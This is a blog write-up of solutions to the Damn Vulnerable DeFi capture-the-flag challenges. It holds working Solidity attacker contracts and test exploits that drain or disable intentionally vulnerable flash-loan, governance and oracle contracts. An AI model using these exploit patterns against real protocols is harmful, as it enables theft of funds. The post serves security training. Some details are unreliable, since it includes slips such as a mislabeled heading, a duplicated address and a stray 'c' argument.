---
title: Damn Vulnerable DeFi Solutions
author: Ashiq Amien
date: 2021-04-22 21:00:00 +0200
categories: [Training, Smart Contract Hacking]
tags: training
math: true
---

This post contains the solutions of all 8 [Damn Vulnerable Defi](https://www.damnvulnerabledefi.xyz/) challenges. The challenges are focused around exploiting soldity-based smart contracts. If any of the solutions are unclear, please reach out in the comments below!

## [1. Unstoppable](https://www.damnvulnerabledefi.xyz/challenges/1.html)

The challenge is to prevent the pool from offering flash loans. The flash loan function is as follows:

```javascript
    function flashLoan(uint256 borrowAmount) external nonReentrant {
        require(borrowAmount > 0, "Must borrow at least one token");

        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");

        // Ensured by the protocol via the `depositTokens` function
        assert(poolBalance == balanceBefore);
        
        damnValuableToken.transfer(msg.sender, borrowAmount);
        
        IReceiver(msg.sender).receiveTokens(address(damnValuableToken), borrowAmount);
        
        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
        require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
    }
```

The code attempts to ensure that the `poolBalance` and the `damnVulnerableToken` balance is the same, indicating that the balance is matched 1:1 with user deposits. However, by transferring a token directly to the pool, we can cause the revert to fail, which is enough to prevent the flash loan function from working:

```javascript
    it('Exploit', async function () {
        await this.token.transfer(this.pool.address, ether('1'), { from: attacker });
    });
```

## [2. Naive Receiver](https://www.damnvulnerabledefi.xyz/challenges/2.html)

The challenge is to drain all all of the funds from a user's flash loan receiver contract. We can see the flash loan borrower is specified as a parameter and not as the `msg.sender`, allowing anyone to flash loan into someone else's receiver: 

```javascript
    function flashLoan(address payable borrower, uint256 borrowAmount) external nonReentrant {

        uint256 balanceBefore = address(this).balance;
        require(balanceBefore >= borrowAmount, "Not enough ETH in pool");

        require(address(borrower).isContract(), "Borrower must be a deployed contract");
        // Transfer ETH and handle control to receiver
        (bool success, ) = borrower.call{value: borrowAmount}(
            abi.encodeWithSignature(
                "receiveEther(uint256)",
                FIXED_FEE
            )
        );
        require(success, "External call failed");
        
        require(
            address(this).balance >= balanceBefore.add(FIXED_FEE),
            "Flash loan hasn't been paid back"
        );
    }
```

By flash-loaning through the contract several times, we can siphon out the balance due to the flash loan fees. By writing our own attacker contract, we can do it all in one transaction:

```javascript
    function attack(address payable borrower, uint256 borrowAmount, address payable lenderpool) external {

        for (uint i = 0; i < 10; i++) {

            NaiveReceiverLenderPool pool = NaiveReceiverLenderPool(lenderpool);
            pool.flashLoan(borrower, borrowAmount);
        }
        
    }
```
```javascript
it('Exploit', async function () {
        this.attackpool = await FlashloanAttacker.new({ from: attacker });
        await this.attackpool.attack(this.receiver.address, ether('1'), this.pool.address, {from: attacker});
    });
```
## [3. Truster](https://www.damnvulnerabledefi.xyz/challenges/3.html)

Our goal is to steal all of the tokens from the pool, exploiting the following flash loan function:

```javascript
    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    )
        external
        nonReentrant
    {
        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");
        
        damnValuableToken.transfer(borrower, borrowAmount);
        (bool success, ) = target.call(data);
        require(success, "External call failed");

        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
        require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
    }
```

While all flash loans allow the user to execute code at another contract, the function name is usually specified as `FlashloanReceiver` or similar. In this case, we can specify both the target and the data, meaning that we can execute code at any contract with the pool as the `msg.sender`. We can abuse this by approving ourself to `transferFrom` all the tokens from the pool, as follows:

```javascript
    function stealPool (
        uint256 borrowAmount,
        address borrower,
        address targetpool,
        address tokenaddy
        )
        public
    {
        //instantiate the pool and token at the given addresses
        TrusterLenderPool pool = TrusterLenderPool(targetpool);
        IERC20 token = IERC20(tokenaddy);

        //encode the call to approve the allowance for this contract        
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), uint(-1));
        
        //we don't want to loan anything, we just want to approve an allowance on the token in the context of the pool
        pool.flashLoan(0, borrower, tokenaddy, data);
        
        //use the allowance to transfer the tokens from the pool to the attacker
        token.transferFrom(targetpool , borrower, token.balanceOf(targetpool));
        
    }
```
```javascript
    it('Exploit', async function () {
        let attackerContract = await TrusterExploit.new({ from: deployer });
        attackerContract.stealPool(ether('1000000'), attacker, this.pool.address, this.token.address);
    });
```

## [4. Side Entrance](https://www.damnvulnerabledefi.xyz/challenges/4.html)

This pool allows user's to deposit and withdraw ETH at any time, while also maintaining flash loan functionality. Due to the way deposits are counted, we can flash loan out some ETH and call the deposit function. This tracks that we've deposited some ETH even though we're just returning the ETH from the contract.

```javascript
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }       
```
We can create an attacker contract to exploit this and siphon out all of the ETH in the contract:
```javascript
    //our flash loan receiver function
    function execute() external payable override {
        SideEntranceLenderPool selp = SideEntranceLenderPool(msg.sender);
        //deposit the ether back to increase our balance
        selp.deposit{value: address(this).balance}();
    }

    //attacker function to initiate the attack
    function getbread(address pool, uint256 amount) public payable {
        SideEntranceLenderPool selp = SideEntranceLenderPool(pool);
        //flash loan 1000 ether
        selp.flashLoan(amount);
        //after execute() runs, our tracked balance is 1000 ether
        selp.withdraw();
        //send the 1000 ether back to ourself
        msg.sender.sendValue(address(this).balance);
    }

```
```javascript
    it('Exploit', async function () {
        await this.attackerContract.getbread(this.pool.address, ether('1000'), { from: attacker });
    });
```

## [5. The rewarder](https://www.damnvulnerabledefi.xyz/challenges/5.html)

The contract rewards users who deposit DVT tokens into the contract, based on a snapshot of balances that gets taken every 5 days. By flash loaning the entire pool balance and taking a snapshot for rewards distribution, we can claim all of the rewards while no-one else receives any.

```javascript
    function attack() external {
        DamnValuableToken dvt = DamnValuableToken(liquidityToken);
        FlashLoanerPool flp = FlashLoanerPool(flashLoanPool);
        TheRewarderPool trp = TheRewarderPool(rewarderPool);
        RewardToken rt = RewardToken(trp.rewardToken());
        
        //flash loan the balance of the pool
        uint amtToLoan = dvt.balanceOf(address(flashLoanPool));
        flp.flashLoan(amtToLoan);

        //transfer back stolen tokens
        rt.transfer(attacker, rt.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 amount) external {
        DamnValuableToken dvt = DamnValuableToken(liquidityToken);
        TheRewarderPool trp = TheRewarderPool(rewarderPool);
        
        //deposit, which calls distributeRewards, and we have the entire balance at the snapshot, so everyone else has zero
        dvt.approve(address(rewarderPool), amount);
        trp.deposit(amount);
        trp.withdraw(amount);
        dvt.transfer(flashLoanPool, amount);
    }
```
```javascript
    it('Exploit', async function () {
        this.attackercontract = await AttackerContract.new(this.flashLoanPool.address, this.rewarderPool.address, this.liquidityToken.address, attacker, { from: deployer });        
        
        //run the exploit a few days later to ensure that a snapshot is taken
        await time.increase(time.duration.days(6));
        await this.attackercontract.attack();
    });
```

## [6. Selfie](https://www.damnvulnerabledefi.xyz/challenges/6.html)

Here, we need to exploit the way votes are counted so that we can execute the `drainAllFunds()` function as the governance contract. When flash loaning all of the tokens in the pool, we can take a snapshot of our balance to pass the requirement of the `_hasEnoughVotes()` function. After 3 days, we can execute the action and call `drainAllFunds()` as the governance contract:

```javascript
    function attack() external {
        SelfiePool sp = SelfiePool(selfiePool);
        DamnValuableTokenSnapshot dvt = DamnValuableTokenSnapshot(damnVulnerableToken);
        SimpleGovernance sg = SimpleGovernance(simpleGovernance);
        //flash loan the entire pool balance
        uint balance = dvt.balanceOf(selfiePool);
        sp.flashLoan(balance);
    }

    function receiveTokens(address token, uint256 amount) external {
        DamnValuableTokenSnapshot dvt = DamnValuableTokenSnapshot(damnVulnerableToken);
        require(dvt.balanceOf(address(this)) == amount, "...your tokens didn't make the journey :(");
        //take a snapshot so that `_hasEnoughVotes` uses the latest snapshot when we have the balance
        dvt.snapshot();
        dvt.transfer(selfiePool, amount);
        //the action should be to execute the drainAllFunds function on the SelfiePool instance
        SimpleGovernance sg = SimpleGovernance(simpleGovernance);
        actionId = sg.queueAction(selfiePool, abi.encodeWithSignature("drainAllFunds(address)", address(this)), 0);
    }

    function callAction(address receiver) external {
        //Vote passed, call the queued action
        SimpleGovernance sg = SimpleGovernance(simpleGovernance);
        sg.executeAction(actionId);
        //transfer stolen tokens back
        DamnValuableTokenSnapshot dvt = DamnValuableTokenSnapshot(damnVulnerableToken);
        uint balance = dvt.balanceOf(address(this));
        dvt.transfer(receiver, balance);
    }
```
```javascript
    it('Exploit', async function () {
        this.attackercontract = await SelfieAttacker.new(this.pool.address, this.governance.address, { from: deployer });  
        await this.attackercontract.attack();
        await time.increase(time.duration.days(3));
        await this.attackercontract.callAction(attacker);    
    });
```

## [7. Compromised](https://www.damnvulnerabledefi.xyz/challenges/7.html)

We need to steal all of the ETH available on the exchange by tampering with the oracles setting the NFT price. The price is set by with median price from 3 oracles: `0xA73209FB1a42495120166736362A1DfA9F95A105`,`0xe92401A4d3af5E446d93D11EEc806b1462b39D15` and `0x81A5D6E50C214044bE44cA0CB057fe119097850c`. The challenge also gives us the following info:

```
    HTTP/2 200 OK
    content-type: text/html
    content-language: en
    vary: Accept-Encoding
    server: cloudflare

    4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35

    4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34
        
```

Dropping each hex snippet into [CyberChef](https://gchq.github.io/CyberChef/) using the `Magic` operation, we get `0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9` and `0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48` respectively. The 2 returned hex strings look a bit long for addresses, and after poking around we find that we have 2 private keys corresponding to `0xe92401A4d3af5E446d93D11EEc806b1462b39D15` and `0xe92401A4d3af5E446d93D11EEc806b1462b39D15`. Since we have the keys of 2 of the 3 oracles, we can set the price to anything we want. This is enough to drain the funds from the exchange, as follows:

```javascript
    it('Exploit', async function () {
        //import first oracle
        await web3.eth.personal.importRawKey('0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9', '');
        await web3.eth.personal.unlockAccount('0xe92401A4d3af5E446d93D11EEc806b1462b39D15', '', 10000000);
        
        //import second oracle
        await web3.eth.personal.importRawKey('0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48', '');
        await web3.eth.personal.unlockAccount('c', '', 10000000);
        
        //we get the median price, so changing 2 of the 3 to the same value will become the median. Change price to 0 ether
        await this.oracle.postPrice("DVNFT", 0, {from: '0xe92401A4d3af5E446d93D11EEc806b1462b39D15'});
        await this.oracle.postPrice("DVNFT", 0, {from: '0x81A5D6E50C214044bE44cA0CB057fe119097850c'});

        //send some ether, it gets refunded anyway
        await this.exchange.buyOne({value: ether('1')});

        //we get the median price, so changing 2 of the 3 to the same value will become the median. Change price to 1000 ether
        await this.oracle.postPrice("DVNFT", ether('10000'), {from: '0xe92401A4d3af5E446d93D11EEc806b1462b39D15'});
        await this.oracle.postPrice("DVNFT", ether('10000'), {from: '0x81A5D6E50C214044bE44cA0CB057fe119097850c'});

        //sell NFT, which drains the exchange's funds
        await this.token.approve(this.exchange.address, 1);
        await this.exchange.sellOne(1);
    });
```

## [8. Compromised](https://www.damnvulnerabledefi.xyz/challenges/8.html)

The `PuppetPool` contract allows users to borrow tokens by depositing twice the value of ETH sent. However, the price is determined by the balances in the Uniswap liquidity pool as follows:

```javascript
    function computeOraclePrice() public view returns (uint256) {
        return uniswapOracle.balance.div(token.balanceOf(uniswapOracle));
    }
```

The liquidity pool starts with 10 ETH and 10 DVT balances. If we want to swap 10 DVT for ETH, we need to maintain $$ 10 * 10 = 100 = 20 * x $$ where $$ x $$ is the number of ETH remaining in the pool. This means we'll receive 5 ETH from swapping 10 DVT. However, this also means `computeOraclePrice()` will return $$ 5/20 = 0 $$ as the oracle price since integer division is used. Now we can borrow any amount of tokens, as along as we provide, well, nothing!

```javascript
    it('Exploit', async function () {
        this.token.approve(this.uniswapExchange.address, ether('100000'), {from: attacker});
        this.uniswapExchange.tokenToEthSwapInput(ether('10'), ether('1'), (await web3.eth.getBlock('latest')).timestamp * 2, {from: attacker});
        this.lendingPool.borrow(ether('10000'), {value: ether('1'), from: attacker});
    });
```

## Conclusion

Overall, these challenges were fun and I've learnt a lot along the way. I also really like the way the challenges are laid out, where you just need to code up your own contracts and short exploit snippets on your machine - no messing with private or testnet chains. If you're interested in DeFi or smart contract security, I'd highly recommend giving this a try! 